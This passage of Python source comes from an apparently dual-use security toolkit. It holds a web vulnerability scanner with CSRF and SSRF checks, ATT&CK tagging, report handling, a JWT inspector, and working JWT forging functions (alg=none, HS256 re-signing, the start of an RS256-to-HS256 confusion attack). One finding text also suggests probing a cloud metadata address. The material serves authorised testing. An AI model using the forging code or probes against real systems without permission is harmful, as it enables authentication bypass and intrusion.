    else:
        issues.append(Issue(
            SEV_LOW, "WAF / CDN",
            "No WAF or CDN detected in response headers",
            "No common WAF/CDN signatures were found. "
            "The origin server may be directly exposed to attack traffic.",
            "Consider placing a WAF in front of the application "
            "(Cloudflare, AWS WAF, ModSecurity, or similar).",
        ))





def _fetch_tool_run(run_id: int) -> dict[str, Any] | None:
    """Return a saved run as a dict or None if the ID does not exist."""
    _init_db()
    conn = sqlite3.connect(DB_FILE)
    try:
        row = conn.execute(
            """
            SELECT id, tool, target, started_at, summary, report
            FROM tool_runs
            WHERE id = ?
            """,
            (int(run_id),),
        ).fetchone()
    finally:
        conn.close()

    if not row:
        return None
    return {
        "id": row[0],
        "tool": row[1],
        "target": row[2],
        "started_at": row[3],
        "summary": row[4],
        "report": row[5],
    }


def _extract_finding_pairs(report_text: str) -> list[tuple[str, str]]:
    """Pull structured [category, title] pairs out of a saved scan report."""
    pairs = []
    if not report_text:
        return pairs
    for match in re.finditer(r'^\s*\[\d+\]\s+\[(?P<category>[^\]]+)\]\s+(?P<title>.+)$', report_text, re.MULTILINE):
        pairs.append((match.group('category').strip(), match.group('title').strip()))
    return pairs


def _compare_tool_run_reports(run_a: dict[str, Any], run_b: dict[str, Any]) -> str:
    """Generate a human-readable diff between two saved tool runs."""
    lines = []
    lines.append(f"Run A: #{run_a['id']}  |  {run_a['tool']}  |  {run_a['started_at']}")
    lines.append(f"Target A: {run_a['target'] or '-'}")
    lines.append(f"Summary A: {run_a['summary'] or '-'}")
    lines.append("")
    lines.append(f"Run B: #{run_b['id']}  |  {run_b['tool']}  |  {run_b['started_at']}")
    lines.append(f"Target B: {run_b['target'] or '-'}")
    lines.append(f"Summary B: {run_b['summary'] or '-'}")
    lines.append("")

    if run_a['tool'] != run_b['tool']:
        lines.append(f"[!] Warning: different tool types compared ({run_a['tool']} vs {run_b['tool']}).")
        lines.append("")

    a_pairs = _extract_finding_pairs(run_a.get('report') or '')
    b_pairs = _extract_finding_pairs(run_b.get('report') or '')
    a_set = set(a_pairs)
    b_set = set(b_pairs)
    added = sorted(b_set - a_set)
    removed = sorted(a_set - b_set)

    lines.append(f"Parsed findings: A={len(a_set)}  B={len(b_set)}")
    lines.append("")

    if added:
        lines.append("New findings in Run B:")
        for category, title in added[:25]:
            lines.append(f"  + [{category}] {title}")
        if len(added) > 25:
            lines.append(f"  ... and {len(added) - 25} more")
        lines.append("")
    else:
        lines.append("No new structured findings were parsed in Run B.")
        lines.append("")

    if removed:
        lines.append("Findings no longer present in Run B:")
        for category, title in removed[:25]:
            lines.append(f"  - [{category}] {title}")
        if len(removed) > 25:
            lines.append(f"  ... and {len(removed) - 25} more")
        lines.append("")
    else:
        lines.append("No structured findings disappeared between the two runs.")
        lines.append("")

    if run_a.get('report') and run_b.get('report'):
        lines.append("Report size:")
        lines.append(f"  Run A: {len(run_a['report']):,} characters")
        lines.append(f"  Run B: {len(run_b['report']):,} characters")

    return "\n".join(lines)




def _check_well_known_files(base_url: str, session: Any, issues: list["Issue"]) -> None:
    """Probe common well-known site files and manifests for passive recon."""
    import urllib.parse

    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    targets = [
        ("/.well-known/security.txt", "security.txt"),
        ("/security.txt", "security.txt"),
        ("/sitemap.xml", "sitemap.xml"),
        ("/site.webmanifest", "manifest.json"),
        ("/manifest.json", "manifest.json"),
        ("/humans.txt", "humans.txt"),
    ]

    for path, kind in targets:
        url = urllib.parse.urljoin(origin, path)
        try:
            resp = session.get(url, timeout=6, allow_redirects=True)
        except Exception:
            continue

        if resp.status_code != 200 or not resp.text.strip():
            continue

        text = resp.text.strip()
        if kind == "security.txt":
            interesting = []
            for line in text.splitlines():
                lower = line.lower().strip()
                if lower.startswith(("contact:", "policy:", "encryption:", "expires:")):
                    interesting.append(line.strip())
            detail = " | ".join(interesting[:4]) if interesting else f"security.txt present with {len(text.splitlines())} line(s)"
            issues.append(Issue(
                SEV_INFO, "Well-Known Files",
                f"Discovered {path}",
                detail,
                "Review the contact and policy details exposed in security.txt.",
            ))
        elif kind == "sitemap.xml":
            urls = re.findall(r"<loc>(.*?)</loc>", text, flags=re.I)
            sample = ", ".join(urls[:5]) if urls else "No <loc> entries parsed."
            issues.append(Issue(
                SEV_INFO, "Well-Known Files",
                "sitemap.xml exposed",
                f"sitemap.xml exposes {len(urls)} URL(s). Sample: {sample}",
                None,
            ))
        elif kind == "manifest.json":
            try:
                manifest = resp.json()
            except Exception:
                manifest = {}
            name = manifest.get("name") or manifest.get("short_name") or "unknown"
            start_url = manifest.get("start_url") or "unknown"
            icons = manifest.get("icons")
            icon_count = len(icons) if isinstance(icons, list) else 0
            issues.append(Issue(
                SEV_INFO, "Well-Known Files",
                f"Discovered {path}",
                f"name={name!r}, start_url={start_url!r}, icons={icon_count}",
                None,
            ))
        elif kind == "humans.txt":
            issues.append(Issue(
                SEV_INFO, "Well-Known Files",
                "humans.txt exposed",
                f"humans.txt present with {len(text.splitlines())} line(s)",
                None,
            ))
# ── Report renderer ───────────────────────────────────────────────────────────

# ── MITRE ATT&CK annotations ────────────────────────────────────────────────
# Each entry: (category_substring, title_substring, technique, tactic, mitigation)
# Matching is case-insensitive substring. First match wins.

MITRE_ATTACK_MAP = [
    ("cors",               "",                         "T1539",     "Collection: Steal Web Session Cookie",              "M1054"),
    ("open redirect",      "",                         "T1598",     "Phishing: Spearphishing Link",                      "M1017"),
    ("sensitive paths",    ".git",                     "T1213",     "Collection: Data from Information Repositories",    "M1022"),
    ("sensitive paths",    ".env",                     "T1552.001", "Credential Access: Credentials in Files",           "M1022"),
    ("sensitive paths",    "exposed:",                 "T1552.001", "Credential Access: Credentials in Files",           "M1022"),
    ("sensitive paths",    "backup",                   "T1552.001", "Credential Access: Credentials in Files",           "M1022"),
    ("robots.txt",         "",                         "T1082",     "Discovery: System Information Discovery",           "M1016"),
    ("cookies",            "samesite",                 "T1539",     "Collection: Steal Web Session Cookie",              "M1054"),
    ("cookies",            "httponly",                 "T1539",     "Collection: Steal Web Session Cookie",              "M1054"),
    ("cookies",            "secure",                   "T1557",     "Collection: Adversary-in-the-Middle",               "M1041"),
    ("transport",          "no redirect to https",     "T1557",     "Collection: Adversary-in-the-Middle",               "M1041"),
    ("transport",          "http version serves",      "T1557",     "Collection: Adversary-in-the-Middle",               "M1041"),
    ("transport",          "redirect does not point",  "T1557",     "Collection: Adversary-in-the-Middle",               "M1041"),
    ("ssl/tls",            "",                         "T1557",     "Collection: Adversary-in-the-Middle",               "M1041"),
    ("http methods",       "trace",                    "T1040",     "Collection: Network Sniffing",                      "M1042"),
    ("security headers",   "content-security-policy",  "T1059.007", "Execution: Command/Script — JavaScript",            "M1021"),
    ("security headers",   "x-frame-options",          "T1185",     "Collection: Browser Session Hijacking",             "M1017"),
    ("security headers",   "",                         "T1185",     "Collection: Browser Session Hijacking",             "M1021"),
    ("technology fingerprint", "",                     "T1592",     "Reconnaissance: Gather Victim Host Information",    "M1056"),
    ("sql",                "",                         "T1190",     "Initial Access: Exploit Public-Facing Application", "M1051"),
    ("xss",                "",                         "T1059.007", "Execution: Command/Script — JavaScript",            "M1021"),
]


def _apply_attack_tags(issue: "Issue") -> None:
    """
    Match an Issue against the MITRE ATT&CK map.
    Returns a formatted tag string or None if no entry matches.
    Category and title matching is case-insensitive substring.
    """
    cat   = issue.category.lower()
    title = issue.title.lower()
    for cat_kw, title_kw, technique, tactic, mitigation in MITRE_ATTACK_MAP:
        if cat_kw and cat_kw not in cat:
            continue
        if title_kw and title_kw not in title:
            continue
        return f"{technique} · {tactic} · Mitigation {mitigation}"
    return None


def _render_report(url: str, issues: list["Issue"], response: Any) -> str:
    """
    Print a full severity-grouped findings report and return it as a string.

    Layout:
      Header  -- target URL, date, HTTP status
      Blocks  -- one block per severity level that has findings
                 each finding shows: title, detail, and fix tip
      Summary -- count per severity + total, shown as a bar chart
    """
    if RICH_AVAILABLE:
        out = []

        def add(text: str = "") -> None:
            out.append(text)

        add("SCAN REPORT")
        add(f"Target  : {url}")
        add(f"Date    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        add(f"Status  : HTTP {response.status_code} ({len(response.content):,} bytes)")
        add("")

        console.print(Panel(
            f"[bold]Target:[/bold] {url}\n"
            f"[bold]Date:[/bold] {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"[bold]Status:[/bold] HTTP {response.status_code} ({len(response.content):,} bytes)",
            title="SCAN REPORT",
            border_style="cyan",
        ))

        if not issues:
            console.print("[green]No issues detected in the selected checks.[/green]")
            add("No issues detected in the selected checks.")
            return "\n".join(out)

        by_sev = {s: [] for s in SEV_ORDER}
        for issue in issues:
            by_sev[issue.severity].append(issue)

        severity_styles = {
            SEV_CRITICAL: "bold red",
            SEV_HIGH: "red",
            SEV_MEDIUM: "yellow",
            SEV_LOW: "blue",
            SEV_INFO: "green",
        }

        for sev in SEV_ORDER:
            sev_issues = by_sev[sev]
            if not sev_issues:
                continue
            add(f"{sev} -- {len(sev_issues)} finding(s)")
            table = Table(title=f"{sev} Findings", show_lines=True, title_style=severity_styles[sev])
            table.add_column("#", justify="right", width=4)
            table.add_column("Category", style="cyan")
            table.add_column("Title", style=severity_styles[sev])
            table.add_column("Detail")
            table.add_column("Fix")
            table.add_column("ATT&CK", style="dim", width=16)
            for i, issue in enumerate(sev_issues, 1):
                atk     = _apply_attack_tags(issue) or ""
                atk_col = atk.split(" · ")[0] if atk else ""   # show just the T-ID in the table
                table.add_row(
                    str(i),
                    issue.category,
                    issue.title,
                    issue.detail,
                    issue.fix or "",
                    atk_col,
                )
                add(f"[{i}] [{issue.category}] {issue.title}")
                add(f"    Detail: {issue.detail}")
                if issue.fix:
                    add(f"    Fix   : {issue.fix}")
                if atk and issue.severity in (SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM):
                    add(f"    ATT&CK: {atk}")
                add("")
            console.print(table)

        summary = Table(title="Findings Summary")
        summary.add_column("Severity")
        summary.add_column("Count", justify="right")
        total = len(issues)
        for sev in SEV_ORDER:
            count = len(by_sev[sev])
            if count:
                summary.add_row(sev, str(count), style=severity_styles[sev])
        summary.add_row("TOTAL", str(total), style="bold")
        console.print(summary)
        add(f"Total findings : {total}")
        return "\n".join(out)

    W = 66      # report column width
    out = []    # lines accumulated for file save

    def line(text: str = "") -> None:
        out.append(text)
        print(text)

    line("\n" + "=" * W)
    line("  SCAN REPORT")
    line(f"  Target  : {url}")
    line(f"  Date    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    line(f"  Status  : HTTP {response.status_code}  "
         f"({len(response.content):,} bytes)")
    line("=" * W)

    if not issues:
        line("\n  No issues detected in the selected checks.")
        line("=" * W)
        return "\n".join(out)

    # Group by severity
    by_sev = {s: [] for s in SEV_ORDER}
    for issue in issues:
        by_sev[issue.severity].append(issue)

    for sev in SEV_ORDER:
        sev_issues = by_sev[sev]
        if not sev_issues:
            continue

        label, prefix = SEV_DISPLAY[sev]
        count = len(sev_issues)
        line(f"\n  {prefix}  {label}  --  {count} finding{'s' if count != 1 else ''}")
        line("  " + "-" * (W - 2))

        for i, issue in enumerate(sev_issues, 1):
            line(f"  [{i}] [{issue.category}]  {issue.title}")
            line(f"       Detail : {issue.detail}")
            if issue.fix:
                line(f"       Fix    : {issue.fix}")
            atk = _apply_attack_tags(issue)
            if atk and issue.severity in (SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM):
                line(f"       ATT&CK : {atk}")
            line()

    # Summary table
    line("=" * W)
    line("  FINDINGS SUMMARY")
    line("  " + "-" * (W - 2))
    total = len(issues)
    for sev in SEV_ORDER:
        count = len(by_sev[sev])
        if not count:
            continue
        label, prefix = SEV_DISPLAY[sev]
        bar = "#" * count
        line(f"  {prefix}  {label:<10} {count:>3}  {bar}")
    line("  " + "-" * (W - 2))
    line(f"  Total findings : {total}")
    line("=" * W)

    return "\n".join(out)


def _save_report(report_text: str, url: str, issues: list["Issue"] | None = None, response: Any = None) -> None:
    """Offer to write the report to timestamped .txt and .json files."""
    ans = input("\n  Save report to file? (y/n): ").strip().lower()
    if ans != "y":
        return

    import urllib.parse
    hostname = urllib.parse.urlparse(url).hostname or "scan"
    safe = _safe_slug(hostname, default="scan")
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    txt_name = f"scan_{safe}_{ts}.txt"

    saved = []
    try:
        with open(txt_name, "w", encoding="utf-8") as f:
            f.write(report_text)
        saved.append(txt_name)
    except OSError as e:
        print(f"  [!] Could not save text report: {e}")

    if issues is not None and response is not None:
        json_name = f"scan_{safe}_{ts}.json"
        payload = {
            "tool": "web_scan",
            "target": url,
            "final_url": response.url,
            "http_status": response.status_code,
            "bytes": len(response.content),
            "generated_at": datetime.datetime.now().isoformat(timespec="seconds"),
            "severity_counts": _issue_severity_counts(issues),
            "findings": [_issue_to_dict(issue) for issue in issues],
        }
        try:
            with open(json_name, "w", encoding="utf-8") as f:
                json.dump(payload, f, indent=2, sort_keys=True)
            saved.append(json_name)
        except OSError as e:
            print(f"  [!] Could not save JSON report: {e}")

    if saved:
        print(f"  [+] Report saved to: {', '.join(saved)}")


def _check_csrf(response: Any, session: Any, issues: list["Issue"]) -> None:
    """
    Passive CSRF detection: scan HTML response for POST forms missing
    anti-CSRF token hidden fields.  Uses regex only — no BeautifulSoup needed.

    Checks for:
      - POST forms with no hidden field whose name matches common CSRF token patterns
      - Presence of a <meta name="csrf-*"> tag as an alternative token delivery method
    Reports MEDIUM for unprotected forms, INFO for fully-protected pages.
    """
    import re

    CSRF_NAMES = {
        "csrf", "csrf_token", "_token", "token", "authenticity_token",
        "__requestverificationtoken", "nonce", "anti_forgery_token",
        "_csrf_token", "csrfmiddlewaretoken", "csrf-token", "x-csrf-token",
        "x-xsrf-token", "_csrf", "xsrf_token",
    }

    html = response.text
    # Meta CSRF tag (used by many SPA frameworks)
    has_meta_csrf = bool(re.search(
        r'<meta\b[^>]+name\s*=\s*["\'][^"\']*csrf[^"\']*["\']',
        html, re.IGNORECASE,
    ))

    unprotected = 0
    protected   = 0
    full_form_re = re.compile(r'<form\b([^>]*)>(.*?)</form>', re.IGNORECASE | re.DOTALL)

    for attrs, body in full_form_re.findall(html):
        if not re.search(r'\bmethod\s*=\s*["\']?\s*post\s*["\']?', attrs, re.IGNORECASE):
            continue   # only POST forms are vulnerable
        input_names = {
            m.lower()
            for m in re.findall(
                r'<input\b[^>]+\bname\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE
            )
        }
        if has_meta_csrf or any(any(kw in n for kw in CSRF_NAMES) for n in input_names):
            protected += 1
        else:
            unprotected += 1

    if unprotected > 0:
        issues.append(Issue(
            SEV_MEDIUM, "CSRF",
            f"POST form(s) with no CSRF token ({unprotected} found)",
            f"{unprotected} POST form(s) detected with no recognisable CSRF token field. "
            "Without a token an attacker can host a page that auto-submits the form "
            "as an authenticated victim.",
            "Add a per-session, cryptographically random CSRF token to every "
            "state-changing form and validate it server-side. "
            "Also set SameSite=Strict or Lax on session cookies as a secondary defence.",
        ))
    elif protected > 0:
        issues.append(Issue(
            SEV_INFO, "CSRF",
            f"CSRF tokens present on all {protected} POST form(s)",
            "All detected POST forms include what appears to be a CSRF token field.",
            "Verify that tokens are validated server-side for every state-changing request "
            "and that they are not predictable or reused across sessions.",
        ))


def _check_ssrf(url: str, response: Any, session: Any, issues: list["Issue"]) -> None:
    """
    Passive SSRF / open-redirect parameter detection.

    Scans the page URL query string and HTML form input names for parameters
    that commonly accept URLs or redirect targets (url=, redirect=, next=, etc.).
    This is intentionally passive — we flag the existence of the parameters
    rather than probing external hosts, so it is safe for any authorised target.
    """
    import re
    from urllib.parse import urlparse, parse_qs

    SSRF_PARAMS = {
        "url", "uri", "path", "src", "source", "dest", "destination",
        "redirect", "redirect_uri", "redirect_url", "return", "returnurl",
        "return_url", "next", "goto", "target", "link", "out",
        "callback", "redir", "continue", "view", "file", "page",
        "endpoint", "host", "domain", "proxy", "forward", "open",
    }

    found = set()

    # Query string parameters in the page URL
    qs = parse_qs(urlparse(response.url).query, keep_blank_values=True)
    for p in qs:
        if p.lower() in SSRF_PARAMS:
            found.add(p)

    # HTML form input names
    html = response.text
    for name in re.findall(
        r'<input\b[^>]+\bname\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE
    ):
        if name.lower() in SSRF_PARAMS:
            found.add(name)

    # Redirect patterns embedded in href / action attributes
    redir_links = re.findall(
        r'(?:href|action)\s*=\s*["\'][^"\']*(?:redirect|return|next|goto|redir)[^"\']*["\']',
        html, re.IGNORECASE,
    )

    if found:
        plist = ", ".join(sorted(found))
        issues.append(Issue(
            SEV_MEDIUM, "SSRF / Open Redirect",
            f"URL-accepting parameter(s) detected: {plist}",
            f"Parameter(s) '{plist}' are commonly exploited for SSRF or open-redirect attacks. "
            "Manual testing is required: supply an internal IP "
            "(e.g. http://127.0.0.1/, http://169.254.169.254/latest/meta-data/) "
            "as the parameter value to check for server-side request forgery.",
            "Validate all URL/path parameters against a strict server-side allowlist. "
            "Never pass user-supplied URLs to back-end HTTP clients without validation. "
            "For redirects, use an indirect reference map rather than raw URLs.",
        ))

    if redir_links:
        issues.append(Issue(
            SEV_LOW, "SSRF / Open Redirect",
            f"Redirect parameter(s) in page links ({len(redir_links)} occurrence(s))",
            "One or more page links or form actions contain redirect/return parameters. "
            "Manual verification is required to confirm whether destinations are validated.",
            "Ensure all redirect destinations are validated against a server-side allowlist.",
        ))


# ── Main scanner entry point ──────────────────────────────────────────────────

def run_web_scanner() -> None:
    """
    Web vulnerability scanner -- 13 checks across 5 categories.

    Transport & TLS
      - HTTPS vs HTTP detection
      - HTTP -> HTTPS redirect verification
      - SSL/TLS certificate (expiry, deprecated versions, weak ciphers)

    HTTP Headers
      - Security headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options,
        X-XSS-Protection, Referrer-Policy, Permissions-Policy)
      - Server information disclosure (Server, X-Powered-By, etc.)
      - CORS policy (wildcard origin, wildcard + credentials combo)
      - Dangerous HTTP methods (TRACE, CONNECT, DELETE, PUT, PATCH)

    Cookies
      - Cookie security flags (Secure, HttpOnly, SameSite) per cookie

    Content & Paths
      - Sensitive file/path exposure (~50 paths: .env, .git, phpinfo,
        DB dumps, admin panels, Spring Boot actuator, API docs, etc.)
      - Robots.txt disclosure (Disallow entries with sensitive keywords)
      - Directory listing (20 common directories checked for Index of /)
      - Open redirect scan (14 common redirect parameters)

    Infrastructure
      - Rate limiting (header check + 15-request burst test)
      - WAF / CDN detection (Cloudflare, ModSecurity, Akamai, Imperva, etc.)
      - Technology fingerprinting with wappalyzer-python
      - Deep TLS validation with SSLyze
      - Explicitly confirmed sqlmap assisted SQL injection testing

    All findings are tagged CRITICAL / HIGH / MEDIUM / LOW / INFO and
    printed together at the end grouped by severity with a fix tip each.
    Report can optionally be saved to a timestamped .txt file.

    Only scan sites you own or have permission to test.
    Requires: pip install requests
    """
    try:
        import requests
        from requests.exceptions import RequestException
    except ImportError:
        print("\n  [!] requests is not installed.  Run:  pip install requests")
        input("\nPress Enter to return to the main menu...")
        return

    print("\n" + "=" * 56)
    print("   Web Vulnerability Scanner")
    print("=" * 56)
    print("  Only scan sites you own or have permission to test.\n")
    print("  Checks available:")
    print("   Transport & TLS")
    print("     A) HTTP -> HTTPS redirect")
    print("     B) SSL/TLS certificate & cipher inspection")
    print("   HTTP Headers")
    print("     C) Security headers  (HSTS, CSP, X-Frame-Options, etc.)")
    print("     D) Server info disclosure  (Server, X-Powered-By, etc.)")
    print("     E) CORS policy")
    print("     F) Dangerous HTTP methods  (TRACE, DELETE, etc.)")
    print("   Cookies")
    print("     G) Cookie security flags  (Secure, HttpOnly, SameSite)")
    print("   Content & Paths")
    print("     H) Sensitive file/path exposure  (~50 paths probed)")
    print("     I) Robots.txt disclosure analysis")
    print("     J) Directory listing detection  (20 directories)")
    print("     K) Open redirect scan  (14 parameters)")
    print("   Infrastructure")
    print("     L) Rate limiting detection")
    print("     M) WAF / CDN detection")
    print("     N) Technology fingerprinting  (wappalyzer-python)")
    print("     O) Deep TLS scan  (SSLyze)")
    print("     P) sqlmap assisted SQLi scan  (requires explicit confirmation)\n     Q) Reflected XSS parameter probe\n")

    # ── Target URL ────────────────────────────────────────────────────
    while True:
        url = _normalize_url(input("  Target URL (e.g. https://example.com): "))
        if not url:
            print("  [!] URL cannot be empty.")
            continue
        if not url.startswith(("http://", "https://")):
            print(f"  [*] No scheme given -- using: {url}")
        break

    # ── Scan profile / check selection ───────────────────────────────
    print()
    print("  Scan profiles:")
    print("    q. Quick    transport, headers, cookies, WAF, tech")
    print("    s. Standard transport + common web misconfig checks")
    print("    d. Deep     standard + SSLyze, with explicit sqlmap opt-in")
    print("    c. Custom   choose every check manually")

    while True:
        profile = input("\n  Select profile [s]: ").strip().lower() or "s"
        if profile in ("q", "s", "d", "c"):
            break
        print("  [!] Choose q, s, d, or c.")

    check_menu = [
        ("http_redirect", "HTTP -> HTTPS redirect check"),
        ("ssl",           "SSL/TLS certificate & cipher check"),
        ("headers",       "Security headers check"),
        ("server",        "Server info disclosure check"),
        ("cors",          "CORS policy check"),
        ("methods",       "HTTP methods check"),
        ("cookies",       "Cookie security flags check"),
        ("paths",         "Sensitive path exposure scan"),
        ("robots",        "Robots.txt disclosure check"),
        ("dirlist",       "Directory listing check"),
        ("redirect",      "Open redirect scan"),
        ("ratelimit",     "Rate limiting check"),
        ("waf",           "WAF / CDN detection"),
        ("tech",          "Technology fingerprinting"),
        ("sslyze",        "SSLyze deep TLS scan"),
        ("sqlmap",        "sqlmap assisted SQLi scan"),
        ("xss",           "Reflected XSS parameter probe"),
        ("wellknown",     "Well-known files & manifests"),
        ("csrf",          "CSRF token detection on POST forms"),
        ("ssrf",          "SSRF / open-redirect parameter scan"),
    ]

    presets = {
        "q": {"http_redirect": True, "ssl": True, "headers": True, "server": True,
              "cors": False, "methods": False, "cookies": True, "paths": False,
              "robots": False, "dirlist": False, "redirect": False, "ratelimit": False,
              "waf": True, "tech": True, "sslyze": False, "sqlmap": False, "xss": False,
              "wellknown": True, "csrf": False, "ssrf": False},
        "s": {"http_redirect": True, "ssl": True, "headers": True, "server": True,
              "cors": True, "methods": True, "cookies": True, "paths": True,
              "robots": True, "dirlist": True, "redirect": True, "ratelimit": True,
              "waf": True, "tech": True, "sslyze": False, "sqlmap": False, "xss": True,
              "wellknown": True, "csrf": True, "ssrf": True},
        "d": {"http_redirect": True, "ssl": True, "headers": True, "server": True,
              "cors": True, "methods": True, "cookies": True, "paths": True,
              "robots": True, "dirlist": True, "redirect": True, "ratelimit": True,
              "waf": True, "tech": True, "sslyze": True, "sqlmap": False, "xss": True,
              "wellknown": True, "csrf": True, "ssrf": True},
    }

    if profile == "c":
        checks = {}
        for key, label in check_menu:
            while True:
                ans = input(f"  Run {label}? (y/n): ").strip().lower()
                if ans in ("y", "n"):
                    checks[key] = (ans == "y")
                    break
    else:
        checks = dict(presets[profile])

    if not any(checks.values()):
        print("\n  [!] No checks selected.")
        input("\nPress Enter to return to the main menu...")
        return

    # ── Connect to target ─────────────────────────────────────────────
    print(f"\n  [*] Connecting to {url} ...")
    session = requests.Session()
    session.headers.update({"User-Agent": _random_user_agent("Scanner")})

    try:
        response = session.get(url, timeout=10, allow_redirects=True)
    except RequestException as e:
        print(f"\n  [!] Could not reach target: {e}")
        input("\nPress Enter to return to the main menu...")
        return

    print(f"  [+] Response  : HTTP {response.status_code}  "
          f"({len(response.content):,} bytes)")
    print(f"  [+] Final URL : {response.url}")

    # ── Run selected checks ───────────────────────────────────────────
    issues = []

    # Transport (always run -- baseline check)
    _check_https(url, issues)

    if checks.get("http_redirect"):
        print("\n  [*] Checking HTTP -> HTTPS redirect ...")
        _check_http_to_https_redirect(url, session, issues)

    if checks.get("ssl"):
        print("\n  [*] Inspecting SSL/TLS certificate ...")
        _check_ssl_tls(url, issues)

    if checks.get("sslyze"):
        _run_sslyze_scan(url, issues)

    if checks.get("headers"):
        print("\n  [*] Checking security headers ...")
        _check_security_headers(response, issues)

    if checks.get("server"):
        print("  [*] Checking server disclosure headers ...")
        _check_server_disclosure(response, issues)

    if checks.get("cors"):
        print("  [*] Checking CORS policy ...")
        _check_cors(response, issues)

    if checks.get("methods"):
        print("  [*] Checking allowed HTTP methods ...")
        _check_http_methods(url, session, issues)

    if checks.get("cookies"):
        print("  [*] Checking cookie security flags ...")
        _check_cookies(response, issues)

    if checks.get("paths"):
        # shows its own progress line inside the function
        _check_sensitive_paths(url, session, issues)

    if checks.get("robots"):
        print("\n  [*] Fetching and analysing robots.txt ...")
        _check_robots_txt(url, session, issues)

    if checks.get("dirlist"):
        # shows its own progress line inside the function
        _check_directory_listing(url, session, issues)

    if checks.get("redirect"):
        # shows its own progress line inside the function
        _check_open_redirect(url, session, issues)

    if checks.get("ratelimit"):
        # shows its own progress line inside the function
        _check_rate_limiting(url, session, response, issues)

    if checks.get("waf"):
        print("\n  [*] Checking for WAF / CDN ...")
        _check_waf_detection(response, issues)

    if checks.get("tech"):
        print("\n  [*] Fingerprinting technology stack ...")
        _check_tech_stack(response.url, response, issues)

    if checks.get("xss"):
        print("\n  [*] Probing for reflected XSS ...")
        _check_reflected_xss(url, session, issues)

    if checks.get("sqlmap"):
        _run_sqlmap_assisted_scan(response.url, issues)

    if checks.get("csrf"):
        print("\n  [*] Checking for CSRF token coverage ...")
        _check_csrf(response, session, issues)

    if checks.get("ssrf"):
        print("  [*] Scanning for SSRF / open-redirect parameters ...")
        _check_ssrf(url, response, session, issues)

    # ── Render findings report ────────────────────────────────────────
    report_text = _render_report(url, issues, response)
    run_id = _save_tool_run("web_scan", url, f"{len(issues)} findings", report_text)
    if run_id:
        print(f"\n  [+] Saved scan to SQLite result #{run_id}.")
    _save_report(report_text, url, issues=issues, response=response)

    input("\nPress Enter to return to the main menu...")


# ─────────────────────────────────────────────
#  ENCODER / DECODER
# ─────────────────────────────────────────────

def _jwt_b64url_decode(part: str) -> bytes:
    padded = part + "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def _format_jwt_timestamp(value: Any) -> str:
    try:
        dt = datetime.datetime.fromtimestamp(int(value), datetime.timezone.utc)
        return dt.strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(value)


def inspect_jwt_token(token: str) -> str:
    """
    Decode a JWT without verifying its signature.

    This is an inspector, not an authenticator. It is useful for spotting
    dangerous header choices and reading claims during authorized testing.
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("JWT must have exactly three dot-separated parts.")

    header = json.loads(_jwt_b64url_decode(parts[0]).decode("utf-8"))
    payload = json.loads(_jwt_b64url_decode(parts[1]).decode("utf-8"))
    signature = parts[2]

    warnings = []
    alg = str(header.get("alg", "")).lower()
    if not alg:
        warnings.append("Missing alg header.")
    elif alg == "none":
        warnings.append("alg=none is unsafe unless the application explicitly rejects unsigned tokens.")
    elif alg.startswith("hs"):
        warnings.append("HMAC alg used. Make sure the shared secret is long, random, and never public.")

    for risky_header in ("jku", "x5u"):
        if risky_header in header:
            warnings.append(f"Header includes {risky_header}; remote key URLs must be strictly allowlisted.")
    if "kid" in header:
        warnings.append("Header includes kid; ensure key lookup cannot be abused for path traversal or injection.")

    now = datetime.datetime.now(datetime.timezone.utc).timestamp()
    if "exp" in payload:
        exp = int(payload["exp"])
        if exp < now:
            warnings.append(f"Token is expired (exp={_format_jwt_timestamp(exp)}).")
    else:
        warnings.append("No exp claim; bearer tokens should usually expire.")
    if "nbf" in payload and int(payload["nbf"]) > now:
        warnings.append(f"Token is not valid yet (nbf={_format_jwt_timestamp(payload['nbf'])}).")

    lines = []
    lines.append("JWT HEADER")
    lines.append(json.dumps(header, indent=2, sort_keys=True))
    lines.append("")
    lines.append("JWT PAYLOAD")
    pretty_payload = dict(payload)
    for claim in ("iat", "nbf", "exp"):
        if claim in pretty_payload:
            pretty_payload[f"{claim}_readable"] = _format_jwt_timestamp(pretty_payload[claim])
    lines.append(json.dumps(pretty_payload, indent=2, sort_keys=True))
    lines.append("")
    lines.append("SIGNATURE")
    lines.append(f"{len(signature)} base64url characters present (not verified).")
    if warnings:
        lines.append("")
        lines.append("WARNINGS")
        for warning in warnings:
            lines.append(f"- {warning}")

    return "\n".join(lines)


def _jwt_b64url_encode(data: bytes) -> str:
    """URL-safe base64 encode without padding — standard JWT encoding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _forge_jwt_alg_none(header: dict, payload: dict) -> str:
    """Return a JWT with alg set to none and an empty signature."""
    h = dict(header)
    h["alg"] = "none"
    enc_h = _jwt_b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    enc_p = _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{enc_h}.{enc_p}."


def _forge_jwt_hs256(header: dict, payload: dict, secret: str) -> str:
    """Re-sign a JWT with HS256 using a supplied secret."""
    import hmac as _hmac
    h = dict(header)
    h["alg"] = "HS256"
    enc_h = _jwt_b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    enc_p = _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{enc_h}.{enc_p}".encode("ascii")
    sig = _hmac.new(secret.encode("utf-8"), signing_input, "sha256").digest()
    return f"{enc_h}.{enc_p}.{_jwt_b64url_encode(sig)}"


def _forge_jwt_hs256_rsa_confusion(header: dict, payload: dict, pem_public_key: str) -> str:
    """
    RS256 → HS256 algorithm confusion attack.

    If a server expects RS256 but trusts the client-supplied 'alg' field,
    an attacker can switch alg to HS256 and sign with the RSA PUBLIC KEY
